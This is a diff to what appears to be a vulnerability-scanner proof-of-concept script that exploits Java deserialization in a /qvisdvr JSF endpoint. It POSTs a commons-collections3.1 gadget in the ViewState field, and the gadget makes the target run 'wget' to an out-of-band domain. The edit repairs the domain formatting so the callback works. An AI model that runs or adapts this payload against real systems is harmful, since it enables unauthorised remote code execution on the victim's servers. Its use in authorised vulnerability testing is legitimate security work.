@@ -47,7 +47,7 @@ def poc(url):
 
         path = """/qvisdvr/index.faces;jsessionid={{token}}"""
         method = "POST"
-        data = """javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://oob_domain", "base64")}}"""
+        data = """javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{oob_domain}", "base64")}}""".format(oob_domain=oob_domain)
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
         resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
